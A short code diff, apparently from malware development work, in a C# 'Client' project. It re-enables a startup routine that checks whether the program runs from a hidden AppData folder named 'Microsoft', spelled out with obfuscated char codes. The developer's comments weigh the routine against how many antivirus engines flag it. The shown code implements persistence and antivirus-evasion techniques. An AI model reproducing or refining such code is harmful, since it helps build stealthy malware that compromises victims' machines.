@@ -126,7 +126,7 @@ namespace Client
             } // This method is detected as well.
             catch { }*/
 
-            /*try
+            try
             {
                 if (Directory.GetCurrentDirectory() != Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 
                     "M" + (char)0x69 + (char)0x63 + (char)0x72 + (char)0x6F + (char)0x73 + (char)0x6F + (char)0x66 + (char)0x74, 
@@ -230,7 +230,9 @@ namespace Client
                     return;
                 }
             } // This startup method as well flags the thing in anti virus... all because of this lol.
-            catch { }*/
+            catch { }
+
+            // NO STARTUP THING SHOWS 12 detections
 
             /*byte[] bytes = Encoding.ASCII.GetBytes(System.IO.File.ReadAllText("fromthis.txt"));
             var into = System.IO.File.CreateText("tothis.txt");
